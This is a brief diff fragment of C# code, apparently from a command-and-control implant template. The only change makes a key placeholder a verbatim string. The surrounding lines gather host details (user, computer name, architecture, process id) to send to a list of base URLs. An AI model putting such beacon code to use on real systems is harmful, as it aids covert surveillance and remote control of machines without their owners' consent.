@@ -221,7 +221,7 @@ public class Program
 			foreach (string du in Program.basearray)
 			{
 				var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
-			 	string key = "#REPLACEKEY#";
+			 	string key = @"#REPLACEKEY#";
 			 	baseURL = du;
 			 	string s = baseURL+"#REPLACESTARTURL#"; 
 				try {
